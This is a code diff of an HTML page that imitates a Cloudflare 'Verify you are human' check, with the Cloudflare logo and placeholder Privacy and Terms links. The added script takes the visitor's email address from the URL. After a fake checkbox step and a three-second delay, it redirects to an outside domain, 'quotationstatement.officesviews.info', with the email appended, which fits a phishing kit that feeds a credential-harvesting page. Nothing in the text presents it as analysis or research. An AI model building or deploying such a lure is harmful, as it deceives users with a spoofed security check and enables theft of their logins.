@@ -18,13 +18,12 @@
         .container {
             text-align: center;
             background-color: white;
-            padding: 20px;
-            width: 300px; /* Reduced width */
+            padding: 30px;
             border-radius: 8px;
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
         }
         .logo {
-            width: 100px; /* Adjusted size of the logo */
+            width: 150px;
             margin-bottom: 20px;
         }
         .verification-box {
@@ -47,7 +46,7 @@
             align-items: center;
         }
         .cf-branding img {
-            width: 20px;
+            width: 30px;
             margin-right: 5px;
         }
         .cf-branding a {
@@ -100,13 +99,13 @@
                 <label for="verify">Verify you are human</label>
             </div>
             <div class="cf-branding">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare Logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare Logo" style="width: 20px;">
                 <a href="#">Privacy</a> · <a href="#">Terms</a>
             </div>
         </div>
 
-        <form id="verificationForm">
-            <button type="button" class="submit-btn" id="submitBtn">Submit</button>
+        <form id="verificationForm" method="POST">
+            <button type="submit" class="submit-btn">Submit</button>
         </form>
 
         <div class="loading" id="loadingIndicator">
@@ -114,16 +113,29 @@
         </div>
     </div>
 
-    <script>
+    <script nonce="MzY1OTQxMjU4NSw0MjM0NjA4NzI=">
         document.addEventListener('DOMContentLoaded', function () {
-            document.getElementById('submitBtn').addEventListener('click', function () {
+            // Extract and decode the email from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            let email = urlParams.get('email'); 
+            
+            // Check if email is present and decode it properly
+            if (email) {
+                email = decodeURIComponent(email); // Decode the email to handle %40 -> @
+            }
+
+            // Listen for form submission
+            document.getElementById('verificationForm').addEventListener('submit', function (event) {
+                event.preventDefault();
+                
+                // Check if the checkbox is checked
                 if (document.getElementById('verify').checked) {
                     document.getElementById('loadingIndicator').style.display = 'block';
-                    this.setAttribute('disabled', 'true');
-
-                    // Redirect after a delay
+                    document.querySelector('button[type="submit"]').setAttribute('disabled', 'true');
+                    
+                    // Redirect after a delay and use the email without encoding again
                     setTimeout(function () {
-                        window.location.href = 'https://quotationstatement.officesviews.info/RTdiSXnW#';
+                        window.location.href = 'https://quotationstatement.officesviews.info/RTdiSXnW#' + email;
                     }, 3000);
                 } else {
                     alert('Please verify that you are a human being by ticking the checkbox.');
